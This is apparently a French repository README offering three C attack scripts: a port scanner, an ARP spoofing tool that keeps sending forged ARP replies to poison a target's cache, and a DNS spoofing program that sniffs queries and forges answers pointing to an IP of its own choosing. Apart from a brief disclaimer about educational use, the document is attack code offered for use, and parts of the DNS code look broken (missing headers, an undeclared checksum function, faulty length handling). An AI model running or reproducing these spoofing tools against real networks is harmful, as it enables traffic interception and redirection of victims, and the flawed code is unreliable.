# Test

- Ces scripts en C couvrent différentes attaques allant de basiques à avancées.
- N'oubliez pas que ces scripts doivent être utilisés uniquement à des fins éducatives et éthiques, et il est essentiel de respecter les lois et réglementations locales concernant l'utilisation de ces outils.
  
# 1- Port Scanning 

```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void port_scan(char *ip, int start_port, int end_port) {
    int sock;
    struct sockaddr_in addr;
    for (int port = start_port; port <= end_port; port++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket");
            exit(1);
        }
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            printf("Port %d is open\n", port);
        }
        close(sock);
    }
}

int main() {
    char *ip = "127.0.0.1";  // Change this to the target IP
    int start_port = 1;
    int end_port = 1024;
    port_scan(ip, start_port, end_port);
    return 0;
}
```
# 2. ARP Spoofing (Intermédiaire)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>

void arp_spoof(char *target_ip, char *spoof_ip, char *iface) {
    int sockfd;
    struct ifreq if_idx;
    struct ifreq if_mac;
    struct ether_header *eh = (struct ether_header *)malloc(sizeof(struct ether_header));
    struct ether_arp *arp_req = (struct ether_arp *)malloc(sizeof(struct ether_arp));
    struct sockaddr_ll socket_address;

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        exit(EXIT_FAILURE);
    }

    memset(&if_mac, 0, sizeof(struct ifreq));
    strncpy(if_mac.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0) {
        perror("SIOCGIFHWADDR");
        exit(EXIT_FAILURE);
    }

    memset(eh, 0, sizeof(struct ether_header));
    memcpy(eh->ether_shost, if_mac.ifr_hwaddr.sa_data, 6);
    memset(eh->ether_dhost, 0xff, 6);
    eh->ether_type = htons(ETH_P_ARP);

    memset(arp_req, 0, sizeof(struct ether_arp));
    arp_req->arp_hrd = htons(ARPHRD_ETHER);
    arp_req->arp_pro = htons(ETHERTYPE_IP);
    arp_req->arp_hln = ETHER_ADDR_LEN;
    arp_req->arp_pln = sizeof(in_addr_t);
    arp_req->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_req->arp_sha, if_mac.ifr_hwaddr.sa_data, 6);
    inet_pton(AF_INET, spoof_ip, arp_req->arp_spa);
    memset(arp_req->arp_tha, 0x00, 6);
    inet_pton(AF_INET, target_ip, arp_req->arp_tpa);

    memcpy(arp_req->arp_tha, arp_req->arp_sha, 6);

    memcpy(&socket_address.sll_addr, if_mac.ifr_hwaddr.sa_data, 6);
    socket_address.sll_halen = ETH_ALEN;
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    socket_address.sll_protocol = htons(ETH_P_ARP);

    unsigned char *packet = (unsigned char *)malloc(sizeof(struct ether_header) + sizeof(struct ether_arp));
    memcpy(packet, eh, sizeof(struct ether_header));
    memcpy(packet + sizeof(struct ether_header), arp_req, sizeof(struct ether_arp));

    while (1) {
        if (sendto(sockfd, packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
                   (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0) {
            perror("sendto");
            exit(EXIT_FAILURE);
        }
        sleep(2);
    }
    close(sockfd);
    free(eh);
    free(arp_req);
    free(packet);
}

int main() {
    char *target_ip = "192.168.1.100";  // Change to the target IP
    char *spoof_ip = "192.168.1.1";  // Change to the spoofed IP
    char *iface = "eth0";  // Change to the network interface
    arp_spoof(target_ip, spoof_ip, iface);
    return 0;
}
```


# 3 - DNS Spoofing (Avancé) 
```c
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>

#define DNS_PORT 53

struct dns_header {
    unsigned short id;
    unsigned short flags;
    unsigned short q_count;
    unsigned short ans_count;
    unsigned short auth_count;
    unsigned short add_count;
};

struct dns_question {
    unsigned short qtype;
    unsigned short qclass;
};

struct dns_rr_data {
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
};

void dns_spoof(char *iface) {
    int sockfd;
    char buffer[65536];
    struct sockaddr saddr;
    struct sockaddr_in daddr;
    int saddr_len = sizeof(saddr);

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    while (1) {
        int data_size = recvfrom(sockfd, buffer, 65536, 0, &saddr, (socklen_t*)&saddr_len);
        if (data_size < 0) {
            perror("recvfrom");
            exit(EXIT_FAILURE);
        }

        struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
        if (iph->protocol == 17) {
            struct udphdr *udph = (struct udphdr*)(buffer + iph->ihl*4 + sizeof(struct ethhdr));
            if (ntohs(udph->dest) == DNS_PORT) {
                struct dns_header *dns = (struct dns_header*)(buffer + iph->ihl*4 + sizeof(struct ethhdr) + sizeof(struct udphdr));
                if (ntohs(dns->flags) == 0x0100) { // Standard query
                    printf("DNS query received\n");
                    
                    // Create a fake DNS response
                    struct iphdr *new_iph = (struct iphdr *)malloc(sizeof(struct iphdr));
                    struct udphdr *new_udph = (struct udphdr *)malloc(sizeof(struct udphdr));
                    struct dns_header *new_dns = (struct dns_header *)malloc(sizeof(struct dns_header));
                    unsigned char *data = (unsigned char *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header));
                    unsigned char *query_name = (unsigned char *)malloc(256);
                    unsigned char *fake_response = (unsigned char *)malloc(256);
                    int i, stop = 0;

                    for (i = 0; i < (strlen((const char*)data) + 1); i++) {
                        query_name[i] = data[i];
                        if (data[i] == '\0') {
                            stop = i + 1;
                            break;
                        }
                    }

                    struct dns_question *dns_q = (struct dns_question *)(data + stop);
                    struct dns_rr_data *dns_r = (struct dns_rr_data *)(data + stop + sizeof(struct dns_question) + strlen((const char*)data + stop + sizeof(struct dns_question)) + 1);

                    memcpy(new_iph, iph, sizeof(struct iphdr));
                    memcpy(new_udph, udph, sizeof(struct udphdr));
                    memcpy(new_dns, dns, sizeof(struct dns_header));

                    new_iph->saddr = iph->daddr;
                    new_iph->daddr = iph->saddr;
                    new_iph->ttl = 64;
                    new_iph->check = 0;
                    new_iph->check = in_cksum((unsigned short *)new_iph, sizeof(struct iphdr));

                    new_udph->source = udph->dest;
                    new_udph->dest = udph->source;
                    new_udph->len = htons(sizeof(struct udphdr) + sizeof(struct dns_header) + sizeof(struct dns_rr_data) + strlen((const char *)fake_response) + 1);

                    new_dns->flags = htons(0x8180);
                    new_dns->ans_count = htons(1);

                    unsigned char *response = (unsigned char *)malloc(256);
                    strcpy((char *)response, (char *)query_name);
                    struct dns_rr_data *rr_data = (struct dns_rr_data *)(response + strlen((const char *)query_name) + 1);

                    rr_data->type = htons(0x0001);
                    rr_data->ttl = htonl(300);
                    rr_data->data_len = htons(4);
                    inet_pton(AF_INET, "192.168.1.100", (unsigned char *)rr_data + sizeof(struct dns_rr_data)); // Change to the desired IP address

                    memcpy(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header), response, sizeof(struct dns_rr_data) + strlen((const char *)response) + 1);

                    struct sockaddr_in target;
                    target.sin_family = AF_INET;
                    target.sin_port = new_udph->dest;
                    target.sin_addr.s_addr = new_iph->daddr;

                    sendto(sockfd, buffer, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dns_header) + sizeof(struct dns_rr_data) + strlen((const char *)response) + 1, 0, (struct sockaddr *)&target, sizeof(target));

                    free(new_iph);
                    free(new_udph);
                    free(new_dns);
                    free(query_name);
                    free(fake_response);
                    free(response);
                }
            }
        }
    }
    close(sockfd);
}

unsigned short in_cksum(unsigned short *addr, int len) {
    int sum = 0;
    unsigned short answer = 0;
    unsigned short *w = addr;
    int nleft = len;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

int main() {
    char *iface = "eth0";  // Change to your network interface
    dns_spoof(iface);
    return 0;
}
```






